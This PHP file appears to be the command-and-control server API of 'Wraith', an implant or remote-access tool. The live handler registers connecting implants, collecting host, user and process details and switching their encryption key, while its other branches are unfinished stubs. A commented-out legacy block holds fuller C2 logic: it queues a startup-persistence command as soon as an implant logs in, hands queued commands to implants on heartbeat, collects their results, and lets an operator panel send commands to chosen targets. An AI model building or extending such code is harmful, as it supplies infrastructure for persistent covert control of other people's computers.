<?php

// Create protocol handler for protocol v0
// Each handler must follow the naming format: Handler_proto_v_{version}
class Handler_proto_v_0 {

    // Handler properties
    private $db; // Copy of the database connection
    private $cType; // Who the request is from
    private $cAddress; // The IP address of the client
    private $cData; // The data to be processed
    private $SETTINGS; // A copy of the API settings
    private $response = []; // The response dict sent when responding

    function __construct($db, $clientType, $clientAddress, $clientData, $SETTINGS) {

        // Copy args to private properties
        $this->db = $db;
        $this->cType = $clientType;
        $this->cAddress = $clientAddress;
        $this->cData = $clientData;
        $this->SETTINGS = $SETTINGS;

    }

    function __destruct() {

        // When the handler is destroyed (API script is about to end)

        // Respond
        respond($this->response);

    }

    function handleRequest() {

        // If the handler was created, the client has passed all checks
        // so it is safe to add the API fingerprint to the response
        $this->response["APIFingerprint"] = $this->SETTINGS["APIFingerprint"];

        // Determine if the client is a manager or Wraith
        if ($this->cType === "wraith") {

            // Wraith

            // Wraith is logging in
            if ($this->cData["reqType"] === "handshake") {

                // Ensure that the required fields are present in the request
                if (
                    !hasKeys($this->cData, [
                        "hostInfo",
                        "wraithInfo",
                    ]) ||
                    !hasKeys($this->cData["hostInfo"], [
                        "arch",
                        "hostname",
                        "osType",
                        "osVersion",
                        "reportedIP",
                    ]) ||
                    !hasKeys($this->cData["wraithInfo"], [
                        "version",
                        "startTime",
                        "plugins",
                        "env",
                        "pid",
                        "ppid",
                        "runningUser",
                    ])
                ) {

                    $this->response["status"] = "ERROR";
                    $this->response["message"] = "missing required headers";

                    return;

                }

                // Add the connecting IP to the host info array
                $this->cData["hostInfo"]["connectingIP"] = getClientIP();
                // Add a generated fingerprint to the host info array
                $this->cData["hostInfo"]["fingerprint"] = "";

                // Create a database entry for the Wraith
                dbAddWraith([
                    "assignedID" => uniqid(),
                    "hostProperties" => json_encode($this->cData["hostInfo"]),
                    "wraithProperties" => json_encode($this->cData["wraithInfo"]),
                    "lastHeartbeatTime" => time(),
                    "issuedCommands" => json_encode([]),
                ]);

                // Return a successful status and message
                $this->response["status"] = "SUCCESS";
                $this->response["message"] = "handshake successful";

                // Add an encryption key switch command to switch to a
                // more secure, non-hard-coded encryption key
                $this->response["switchKey"] = $this->SETTINGS["wraithSwitchCryptKey"];

                // Respond
                return;

                // Wraith is sending heartbeat
            } else if ($this->cData["reqType"] === "heartbeat") {

                    // TODO

                // Wraith is uploading a file
            } else if ($this->cData["reqType"] === "upload") {

                    // TODO

            // Unrecognised request type
            } else {

                $this->response["status"] = "ERROR";
                $this->response["message"] = "request type not implemented in protocol";
                return;

            }

        } else if ($this->cType === "manager") {

            // Manager

            // TODO

        } else {

            // This will never happen if the code is unmodified. However, to gracefully
            // handle mistakes in modification, this should stay here
            $this->response["status"] = "ERROR";
            $this->response["message"] = "the request was identified but methods for handling it were not implemented in this protocol version";
            return;

        }

    }

}

// Add the protocol name to the array of supported protocols
array_push($SUPPORTED_PROTOCOL_VERSIONS, "0");

/*

The below are remains of the Wraith 3.0.0 API. They will be re-written to
work with the new structure. They will only be here temporarily and are the
last parts of any Wraith 3.0.0 code which get comitted to the repo. They
are also the last part of the code to use tabs instead of spaces. Nothing
against tabs. I quite like them in fact. But my IDE uses spaces by default :P

// Only do this if we're talking to a wraith
if ($response["requester_type"] === "wraith") {
	// Let's decide what type of request this is
	$req_type = $request["message_type"];
	if ($req_type === "login") {
		// If the wraith requests a login

		// Make sure the data is the right format
		if (!(is_array($request["data"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Incorrect data format";
			respond();
		}

		// Check if the data has everything we need
		if (!(haskeys($request["data"], ["osname", "ostype", "macaddr"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Missing required client headers in data";
			respond();
		}

		// Create a UUID for the wraith to identify
		$login_wraith_uuid = gen_uuid();
		// Create a database entry for the wraith
		// Populate with data from the wraith's request
		$newwraith["osname"] = $request["data"]["osname"];
		$newwraith["ostype"] = $request["data"]["ostype"];
		$newwraith["macaddr"] = $request["data"]["macaddr"];
		// Assign blank fields
		$newwraith["extra_info"] = [];
		$newwraith["command_queue"] = [];

		// Populate with server-acquired variables
		$newwraith["extip"] = get_client_ip();
		$newwraith["logintime"] = time();
		$newwraith["lastheartbeat"] = time();
		// Write database entry
		wraithdb($login_wraith_uuid, $newwraith);
		// Log the wraith's login to the console
		console_append("API => panel", "INFO", "Wraith ".$login_wraith_uuid." logged in from ".$newwraith["extip"]."/".$newwraith["osname"].".");

		// Instantly send command to install self on startup
		$command = "startupinstall";
		$command_name = explode(" ", $command)[0];
		$commands = get_cmds();

		if (array_key_exists($command_name, $commands)) {
			$script = $commands[$command_name][1];
			wraithdb($login_wraith_uuid, null, "addcmd", [$command, $script]);
			console_append("API => ".$login_wraith_uuid, "SUCCESS", $command);
		} else {
			console_append("API => panel", "ERROR - Command `".$command_name."` not found!", $command);
		}

		// Notify wraith of successful connection
		$response["status"] = "SUCCESS";
		$response["message"] = "Successfully logged in";
		$response["wraith_id"] = $login_wraith_uuid;
		respond();

	} elseif ($req_type === "heartbeat") {
		// If the wraith creates a heartbeat (this sends an info update and/or requests new commands.)
		if (!(haskeys($request["data"], ["info", "wraith_id"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Missing required client headers in data";
			respond();
		}
		// If all headers are present, get wraith ID and process the heartbeat
		$wraith_id = $request["data"]["wraith_id"];
		// If the ID is not present in database, notify
		if (!(wraithdb($wraith_id, null, "checkexist"))) {
			$response["status"] = "ERROR";
			$response["message"] = "Wraith ID invalid";
			respond();
		}
		$wraith_db_entry = wraithdb($wraith_id, null, "get");
		$wraith_db_entry["extra_info"] = $request["data"]["info"];

		// Save any changes made to the wraith's details
		wraithdb($wraith_id, $wraith_db_entry, "add/mod");

		// Add the commands to the response
		$response["command_queue"] = $wraith_db_entry["command_queue"];
		// And remove them from the database
		wraithdb($wraith_id, null, "rmcmds");
		// Mark request as success
		$response["status"] = "SUCCESS";
		// Record the heartbeat
		wraith_heartbeat($wraith_id);
		// Respond to request
		respond();

	} elseif ($req_type === "putresults") {
		// If the wraith sends results from executing a command

		// First, make sure it is logged in
		if (!(haskeys($request["data"], ["wraith_id", "cmdstatus", "result"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Missing required client headers in data";
			respond();
		}
		// If all headers are present, get wraith ID
		$wraith_id = $request["data"]["wraith_id"];
		// If the ID is not present in database, notify
		if (!(wraithdb($wraith_id, null, "checkexist"))) {
			$response["status"] = "ERROR";
			$response["message"] = "Wraith ID invalid";
			respond();
		}

		// If all the checks passed, put the result in the console
		console_append($wraith_id." => panel", $request["data"]["cmdstatus"], $request["data"]["result"]);

		// Mark request as success
		$response["status"] = "SUCCESS";
		// Record the heartbeat
		wraith_heartbeat($wraith_id);
		// Respond to request
		respond();

	}  else {
		$response["status"] = "ERROR";
		$response["message"] = "A non-existent command was requested";
		respond();
	}

// Only do this if we're talking to the panel
} elseif ($response["requester_type"] === "panel") {
	$req_type = $request["message_type"];
	if ($req_type === "panelupdate") {
		try {
			// Get some information about the server and connected wraiths
			$db = get_db();

			// General info section
			$cmds = get_cmds();
			$cmd_names = [];
			foreach ($cmds as $name => $details) { array_push($cmd_names, $name); }
			$serverinfo = [
				"Active Wraith Count" => sizeof($db["active_wraith_clients"]),
				"Available Command Count" => sizeof($cmds),
				"Available Commands" => implode(", ", $cmd_names),
				"API Address" => get_current_url($_SERVER),
			];

			// Wraith info section
			$wraiths = $db["active_wraith_clients"];
			$wraiths_dict = ["Wraith ID" => "Wraith Details"];
			foreach ($db["active_wraith_clients"] as $id => $values) {
				$wraiths_dict[$id] = json_encode($values, JSON_PRETTY_PRINT);
			}

			// Console contents section
			$consolecontents = $db["console_contents"];

			// Response section
			$response["status"] = "SUCCESS";
			$response["serverinfo"] = json_encode($serverinfo);
			$response["wraithinfo"] = json_encode($wraiths_dict);
			$response["consolecontents"] = json_encode($consolecontents);
			respond();
		} catch (Exception $e) {
			$response["status"] = "ERROR";
			$response["message"] = "Error while getting info for panel update";
			respond();
		}

	} elseif ($req_type === "sendcommand") {
		// Send a command to a/multiple wraith/s
		$targets = $request["data"]["targets"];
		$command = $request["data"]["command"];
		$command_name = explode(" ", $command)[0];
		$commands = get_cmds();

		if (array_key_exists($command_name, $commands)) {
			$script = $commands[$command_name][1];

			foreach ($targets as $target) {
				if (wraithdb($target, null, "checkexist")) {
					wraithdb($target, null, "addcmd", [$command, $script]);
					console_append("panel => ".$target, "SUCCESS", $command);
				} else {
					console_append("API => panel", "ERROR - Wraith `".$target."` not found!", $command);
				}
			}
		} else {
			console_append("API => panel", "ERROR - Command `".$command_name."` not found!", $command);
		}

		respond();

	} elseif ($req_type === "clearconsole") {
		// Clear the stored command list in database

		$db = get_db();
		$db["console_contents"] = [];
		write_db($db);

		$response["status"] = "SUCCESS";
		respond();

	} else {
		$response["status"] = "ERROR";
		$response["message"] = "A non-existent command was requested";
		respond();
	}
}
*/
